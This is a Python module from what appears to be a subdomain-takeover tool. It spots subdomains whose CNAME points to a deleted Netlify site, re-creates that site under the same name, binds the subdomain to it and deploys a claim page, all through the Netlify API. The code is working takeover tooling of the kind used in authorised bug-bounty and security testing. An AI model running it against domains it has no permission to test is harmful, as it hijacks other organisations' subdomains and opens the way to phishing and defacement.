"""
app/takeover/providers/netlify.py

Netlify subdomain takeover.

Vulnerable pattern
------------------
  subdomain CNAME → <site-name>.netlify.app  (or .netlify.com)
  The Netlify site no longer exists → we can create it and claim the custom domain.

Auto-takeover
-------------
  1. Create a new Netlify site
  2. Add the subdomain as a custom domain
  3. Deploy claim HTML via Netlify Deploy API (zip upload)

Required .env
-------------
  NETLIFY_TOKEN  — Personal Access Token (User Settings → Applications → PAT)
"""

import asyncio
import io
import json
import re
import zipfile
from typing import Optional, Tuple

import aiohttp

from app.core.config import settings
from app.core.logging import logger
from app.takeover.subdomain_hunter.providers.base import CLAIM_HTML, TakeoverResult, TakeoverStatus

_API     = "https://api.netlify.com/api/v1"
_TIMEOUT = aiohttp.ClientTimeout(total=30)

_NETLIFY_RE = re.compile(
    r"^([a-z0-9][a-z0-9\-]{0,60}[a-z0-9])\.netlify\.(app|com)\.?$",
    re.IGNORECASE,
)


def extract_site_name(cname: str) -> Optional[str]:
    cname = cname.lower().strip().rstrip(".")
    m = _NETLIFY_RE.match(cname)
    return m.group(1) if m else None


class NetlifyTakeoverChecker:

    PROVIDER = "netlify"

    def __init__(self) -> None:
        self._token: Optional[str] = getattr(settings, "NETLIFY_TOKEN", None)
        if not self._token:
            logger.warning("NetlifyTakeoverChecker: NETLIFY_TOKEN not set — disabled")

    async def attempt(self, subdomain_name: str, cname: str) -> TakeoverResult:
        site_name = extract_site_name(cname)
        if not site_name:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error=f"Cannot extract site name from CNAME: {cname}",
            )

        if not self._token:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                evidence={"netlify_site": site_name},
                error="NETLIFY_TOKEN not configured",
            )

        logger.info("netlify takeover: attempting site=%s for %s", site_name, subdomain_name)

        headers = {
            "Authorization": f"Bearer {self._token}",
            "Content-Type":  "application/json",
        }
        try:
            async with aiohttp.ClientSession(timeout=_TIMEOUT, headers=headers) as http:
                return await self._run(http, subdomain_name, site_name)
        except asyncio.TimeoutError:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error="Timeout",
            )
        except Exception as exc:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error=str(exc),
            )

    async def _run(
        self, http: aiohttp.ClientSession, subdomain: str, site_name: str
    ) -> TakeoverResult:
        evidence = {"netlify_site": site_name}

        # 1 — Check if site name is available by trying to create it
        site_id, err = await self._create_site(http, site_name, subdomain)
        if not site_id:
            err_lower = (err or "").lower()

            # Netlify returns two distinct "must be unique" errors:
            #   a) subdomain["must be unique"]           → site name taken → NOT_VULN
            #   b) custom_domain["must be unique (...)"] → domain claimed by another account
            #      The CNAME target site may still be dangling. Return FAIL with
            #      domain_claimed_elsewhere=True so the caller (providers_evaluator)
            #      can downgrade this to POTENTIAL for reverification instead of
            #      leaving it stuck as a DANGLING alert that never resolves.
            if err and "custom_domain" in err_lower and "must be unique" in err_lower:
                logger.warning(
                    "netlify: custom domain %s already claimed by another account — "
                    "flagging for reverification",
                    subdomain,
                )
                return TakeoverResult(
                    status=TakeoverStatus.FAIL,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    confidence_delta=0,
                    evidence={**evidence, "domain_claimed_elsewhere": True},
                    error=f"Custom domain already claimed by another Netlify account: {err}",
                )

            # Site name itself is taken → the .netlify.app target is alive → not vulnerable
            if err and (
                ("subdomain" in err_lower and "must be unique" in err_lower)
                or "already" in err_lower
                or "taken" in err_lower
            ):
                return TakeoverResult(
                    status=TakeoverStatus.NOT_VULN,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    confidence_delta=-30,
                    evidence=evidence,
                    error="Site name already taken",
                )

            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain,
                evidence=evidence,
                error=f"Create site failed: {err}",
            )

        evidence["netlify_site_id"] = site_id

        # 2 — Deploy claim page
        deploy_ok = await self._deploy(http, site_id)
        if not deploy_ok:
            logger.warning("netlify: deploy failed for %s (site still claimed)", subdomain)

        logger.info("netlify takeover: SUCCESS site=%s subdomain=%s", site_name, subdomain)
        return TakeoverResult(
            status=TakeoverStatus.SUCCESS,
            provider=self.PROVIDER,
            subdomain=subdomain,
            confidence_delta=+10,
            evidence={**evidence, "deployed": deploy_ok},
            claim_url=f"https://{subdomain}",
        )

    async def _create_site(
        self, http: aiohttp.ClientSession, site_name: str, custom_domain: str
    ) -> Tuple[Optional[str], Optional[str]]:
        async with http.post(
            f"{_API}/sites",
            json={
                "name":          site_name,
                "custom_domain": custom_domain,
                "force_ssl":     True,
            },
        ) as resp:
            raw = await resp.text()
            if resp.status in (200, 201):
                return json.loads(raw).get("id"), None
            return None, raw[:300]

    async def _deploy(self, http: aiohttp.ClientSession, site_id: str) -> bool:
        """Deploy a zip containing index.html."""
        zip_bytes = _build_zip()
        try:
            async with aiohttp.ClientSession(
                timeout=_TIMEOUT,
                headers={
                    "Authorization": f"Bearer {self._token}",
                    "Content-Type":  "application/zip",
                },
            ) as upload:
                async with upload.post(
                    f"{_API}/sites/{site_id}/deploys",
                    data=zip_bytes,
                ) as resp:
                    return resp.status in (200, 201)
        except Exception as exc:
            logger.warning("netlify deploy error: %s", exc)
            return False


def _build_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("index.html", CLAIM_HTML)
    return buf.getvalue()